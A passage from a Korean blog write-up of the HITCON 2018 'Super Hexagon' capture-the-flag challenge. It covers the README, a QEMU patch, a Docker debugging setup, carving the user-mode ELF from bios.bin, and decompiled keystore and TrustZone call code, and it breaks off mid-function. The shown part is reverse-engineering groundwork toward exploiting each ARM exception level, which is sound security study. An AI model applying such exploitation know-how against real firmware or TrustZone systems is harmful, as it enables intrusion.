</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>op_helper.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">35.000000000</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> qemu<span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>op_helper.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">17</span><span style="color:#f92672">:</span><span style="color:#ae81ff">53</span><span style="color:#f92672">:</span><span style="color:#ae81ff">05.141725519</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">433</span>,<span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">433</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>     cs<span style="color:#f92672">-&gt;</span>exception_index <span style="color:#f92672">=</span> EXCP_HLT;
</span></span><span style="display:flex;"><span>     cs<span style="color:#f92672">-&gt;</span>halted <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>    <span style="color:#a6e22e">cpu_loop_exit</span>(cs);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HELPER</span>(wfe)(CPUARMState <span style="color:#f92672">*</span>env)
</span></span></code></pre></div><p>시스템 레지스터를 읽어서 Exception level 별로 flag를 읽을 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">=====================</span>
</span></span><span style="display:flex;"><span>    Super Hexagon
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1.</span>  Flags have to be read from <span style="color:#ae81ff">8</span> sysregs: s3_3_c15_c12_0 <span style="color:#f92672">~</span> s3_3_c15_c12_7
</span></span><span style="display:flex;"><span>    For example, in aarch64, you may use:
</span></span><span style="display:flex;"><span>            mrs x0, s3_3_c15_c12_0
</span></span><span style="display:flex;"><span>            mrs x1, s3_3_c15_c12_1
</span></span><span style="display:flex;"><span>                             .
</span></span><span style="display:flex;"><span>                             .
</span></span><span style="display:flex;"><span>                             .
</span></span><span style="display:flex;"><span>            mrs x7, s3_3_c15_c12_7
</span></span><span style="display:flex;"><span>    For first two stages, EL0 and EL1, <span style="color:#960050;background-color:#1e0010">`</span>print_flag<span style="color:#960050;background-color:#1e0010">&#39;</span> functions are included.
</span></span><span style="display:flex;"><span>    Make good use of them.
</span></span><span style="display:flex;"><span>    qemu<span style="color:#f92672">-</span>system<span style="color:#f92672">-</span>aarch64, based on qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span>, is also patched to support this
</span></span><span style="display:flex;"><span>    feature. See <span style="color:#960050;background-color:#1e0010">`</span>qemu.patch<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> more details.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span>  You may add <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">-</span>S <span style="color:#f92672">-</span>s<span style="color:#960050;background-color:#1e0010">&#39;</span> to qemu<span style="color:#f92672">-</span>system<span style="color:#f92672">-</span>aarch64 and debug with gdb<span style="color:#f92672">-</span>multiarch.
</span></span><span style="display:flex;"><span>    However, <span style="color:#66d9ef">if</span> you want to debug ARM binary, you have to patch QEMU, since it
</span></span><span style="display:flex;"><span>    always give AArch64 debug information. See <span style="color:#960050;background-color:#1e0010">`</span>qemu<span style="color:#f92672">-</span>arm<span style="color:#f92672">-</span>debug.patch<span style="color:#960050;background-color:#1e0010">&#39;</span>.
</span></span><span style="display:flex;"><span>    Besides, latest gdb <span style="color:#ae81ff">8.2</span> may be less buggy.
</span></span></code></pre></div><p>README에서 어떤식으로 flag를 얻을 수 있는지 나와있다.
편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.</p>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/23f1facbdfa91f4017c01619b48b53ce.png" alt=""  />

exploit 순서는 위와 같다.
각 EL 마다 취약점을 찾아서 익스플로잇하는게 주요 컨셉이다.</p>
<h2 id="debugging-environment">Debugging environment<a hidden class="anchor" aria-hidden="true" href="#debugging-environment">#</a></h2>
<p>docker compose 파일에서 SYS_PTRACE와 1234 포트를 열어서 리모트 디버깅 환경을 구축했다.
그리고 run.sh에 -s 옵션을 추가로 주도록 수정하면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">services</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">super_hexagon</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">build</span><span style="color:#f92672">:</span> .<span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">volumes</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> .<span style="color:#f92672">/</span><span style="color:#a6e22e">share</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">/home/super_hexagon:ro</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> .<span style="color:#f92672">/</span><span style="color:#a6e22e">xinetd</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">/etc/xinetd.d/super_hexagon:ro</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> .<span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">/tmp:ro</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ports</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> <span style="color:#e6db74">&#34;6666:6666&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> <span style="color:#e6db74">&#34;1234:1234&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">expose</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> <span style="color:#e6db74">&#34;6666&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> <span style="color:#e6db74">&#34;1234&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cap_add</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">-</span> <span style="color:#a6e22e">SYS_PTRACE</span>
</span></span></code></pre></div><p>나중에 부득이하게 secure 물리 메모리도 확인해야해서 로컬에서도 디렉토리 구조를 만들어주고 run.sh를 수정했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>super_hexagon<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span>system<span style="color:#f92672">-</span>aarch64 <span style="color:#f92672">-</span>nographic <span style="color:#f92672">-</span>machine hitcon <span style="color:#f92672">-</span>cpu hitcon <span style="color:#f92672">-</span>bios <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>super_hexagon<span style="color:#f92672">/</span>bios<span style="color:#f92672">.</span>bin <span style="color:#f92672">-</span>monitor <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">-</span>serial null <span style="color:#f92672">-</span>s <span style="color:#f92672">-</span>S
</span></span></code></pre></div><h1 id="el0-non-secure-application">EL0, Non-secure application<a hidden class="anchor" aria-hidden="true" href="#el0-non-secure-application">#</a></h1>
<h2 id="carving-an-elf-binary">Carving an ELF binary<a hidden class="anchor" aria-hidden="true" href="#carving-an-elf-binary">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> nc localhost <span style="color:#ae81ff">6666</span>
</span></span><span style="display:flex;"><span>NOTICE:  UART console initialized
</span></span><span style="display:flex;"><span>INFO:    MMU: Mapping <span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2844</span> (<span style="color:#ae81ff">783</span>)
</span></span><span style="display:flex;"><span>INFO:    MMU: Mapping <span style="color:#ae81ff">0xe000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xe204000</span> (<span style="color:#ae81ff">40000000000703</span>)
</span></span><span style="display:flex;"><span>INFO:    MMU: Mapping <span style="color:#ae81ff">0x9000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9001000</span> (<span style="color:#ae81ff">40000000000703</span>)
</span></span><span style="display:flex;"><span>NOTICE:  MMU enabled
</span></span><span style="display:flex;"><span>NOTICE:  BL1: HIT<span style="color:#f92672">-</span>BOOT v1<span style="color:#ae81ff">.0</span>
</span></span><span style="display:flex;"><span>INFO:    BL1: RAM <span style="color:#ae81ff">0xe000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xe204000</span>
</span></span><span style="display:flex;"><span>INFO:      SCTLR_EL3: <span style="color:#ae81ff">30</span>c5083b
</span></span><span style="display:flex;"><span>INFO:      SCR_EL3:   <span style="color:#ae81ff">0000073</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>INFO:    Entry point address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40100000</span>
</span></span><span style="display:flex;"><span>INFO:    SPSR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c9</span>
</span></span><span style="display:flex;"><span>VERBOSE: Argument <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>VERBOSE: Argument <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>VERBOSE: Argument <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>VERBOSE: Argument <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>NOTICE:  UART console initialized
</span></span><span style="display:flex;"><span>[VMM] RO_IPA: <span style="color:#ae81ff">00000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000</span>c000
</span></span><span style="display:flex;"><span>[VMM] RW_IPA: <span style="color:#ae81ff">0000</span>c000<span style="color:#f92672">-</span><span style="color:#ae81ff">0003</span>c000
</span></span><span style="display:flex;"><span>[KERNEL] mmu enabled
</span></span><span style="display:flex;"><span>INFO:      TEE PC: e400000
</span></span><span style="display:flex;"><span>INFO:      TEE SPSR: <span style="color:#ae81ff">1</span>d3
</span></span><span style="display:flex;"><span>NOTICE:  TEE OS initialized
</span></span><span style="display:flex;"><span>[KERNEL] Starting user program ...
</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> Trusted Keystore <span style="color:#f92672">===</span>
</span></span><span style="display:flex;"><span>Command:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span> Load key
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> Save key
</span></span><span style="display:flex;"><span>cmd<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>접속을 해보면, 부팅이 되면서 위의 유저 어플리케이션이 나온다.</p>
<p>bios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> binwalk bios.bin
</span></span><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span style="display:flex;"><span><span style="color:#f92672">--------------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">143472</span>        <span style="color:#ae81ff">0x23070</span>         SHA256 hash constants, little endian
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">770064</span>        <span style="color:#ae81ff">0xBC010</span>         ELF, <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, version <span style="color:#ae81ff">1</span> (SYSV)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">792178</span>        <span style="color:#ae81ff">0xC1672</span>         Unix path: <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc<span style="color:#f92672">/</span>aarch64
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">792711</span>        <span style="color:#ae81ff">0xC1887</span>         Unix path: <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc<span style="color:#f92672">/</span>aarch64
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">794111</span>        <span style="color:#ae81ff">0xC1DFF</span>         Unix path: <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc<span style="color:#f92672">/</span>aarch64
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">796256</span>        <span style="color:#ae81ff">0xC2660</span>         Unix path: <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>seanwu<span style="color:#f92672">/</span>hitcon<span style="color:#f92672">-</span>ctf<span style="color:#f92672">-</span><span style="color:#ae81ff">2018</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> file BC010
</span></span><span style="display:flex;"><span>BC010: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, ARM aarch64, version <span style="color:#ae81ff">1</span> (SYSV), statically linked, with debug_info, not stripped
</span></span></code></pre></div><p>ELF 바이너리가 그대로 들어있어서 이를 추출해서 분석을 시작했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">intro</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">load_trustlet</span>(<span style="color:#f92672">&amp;</span>TA_BIN,<span style="color:#ae81ff">0x750</span>);
</span></span><span style="display:flex;"><span>  cmdtb[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> cmd_load;
</span></span><span style="display:flex;"><span>  cmdtb[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> cmd_save;
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">0</span>b00000011,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (iVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; iVar1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>; iVar1 <span style="color:#f92672">=</span> iVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">run</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">load_trustlet</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>base,<span style="color:#66d9ef">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  uint ta_mem_s;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> result;
</span></span><span style="display:flex;"><span>  uint uVar2;
</span></span><span style="display:flex;"><span>  uint tci_mem_s;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>__dest;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ta_mem;
</span></span><span style="display:flex;"><span>  TCI <span style="color:#f92672">*</span>pTVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>tci_mem;
</span></span><span style="display:flex;"><span>  ulong __len;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  __len <span style="color:#f92672">=</span> (ulong)(size <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffff000</span>;
</span></span><span style="display:flex;"><span>  __dest <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,__len,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_register_wsm</span>(__dest,__len);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;tc_register_wsm: failed to register world shared memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(__dest,base,(<span style="color:#66d9ef">long</span>)size);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_init_trustlet</span>(iVar1,size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    pTVar3 <span style="color:#f92672">=</span> (TCI <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_register_wsm</span>(pTVar3,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (uVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span>      tci_buf <span style="color:#f92672">=</span> pTVar3;
</span></span><span style="display:flex;"><span>      tci_handle <span style="color:#f92672">=</span> uVar2;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;tc_register_wsm: failed to register world shared memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;tc_init_trustlet: failed to load trustlet</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">tc_register_wsm</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             tc_register_wsm                                 XREF[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">:</span>     Entry <span style="color:#a6e22e">Point</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          load_trustlet:<span style="color:#ae81ff">00400174</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          load_trustlet:<span style="color:#ae81ff">004001</span>c8 (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b84 <span style="color:#ae81ff">68</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b88 <span style="color:#ae81ff">08</span>  e0  bf  f2    movk       x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff00</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b8c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  d4    svc        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b90 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">tc_init_trustlet</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             tc_init_trustlet                                XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     Entry <span style="color:#a6e22e">Point</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          load_trustlet:<span style="color:#ae81ff">004001</span><span style="color:#ae81ff">9</span>c (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b74 a8  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x5</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b78 <span style="color:#ae81ff">08</span>  e0  bf  f2    movk       x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff00</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b7c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  d4    svc        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b80 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다.
안에 내용들을 보면 일반적인 번호가 아닌 syscall들을 호출하는 것을 확인할 수 있다.
TA_Bin은 아마 S_EL0의 코드로 보인다.
secure world와 normal world는 서로 world shared memory를 매핑하여 통신하는데, 이를 매핑하는 함수들이 보인다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cmd_load</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">int</span> idx,<span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">load_key</span>(idx,buf);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[%d] =&gt; %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)(uint)idx,buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">load_key</span>(<span style="color:#66d9ef">int</span> x,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>  uint uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>index <span style="color:#f92672">=</span> x;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tc_tci_call</span>(tci_handle);
